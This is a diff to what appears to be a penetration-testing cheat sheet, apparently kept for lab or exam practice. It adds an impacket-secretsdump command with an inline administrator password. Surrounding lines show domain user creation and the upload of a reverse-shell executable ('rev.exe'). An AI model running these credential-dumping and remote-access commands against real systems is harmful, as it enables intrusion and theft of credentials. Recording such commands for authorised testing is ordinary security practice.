@@ -479,7 +479,7 @@ impacket-net ignite.local/administrator:Ignite@192.168.1.8 user -create anubhav 
 impacket-net ignite.local/administrator@dc.ignite.local -k -no-pass user
 ```
 
-### impacket-mssql
+### impacket-mssqlclient
 
 - connection
 
@@ -492,6 +492,12 @@ impacket-net ignite.local/administrator@dc.ignite.local -k -no-pass user
 - file upload (only upload)
 
 `upload ./148/rev.exe c:\windows\temp\rev.exe`
+
+### impacket-secretsdump
+
+- I thinks it's more convenient than Mimikatz
+
+`impacket-secretsdump NIX01/Administrator:'mdm0axd*EQM7xmq.krn'@10.129.101.210`
 
 ## SMB
 
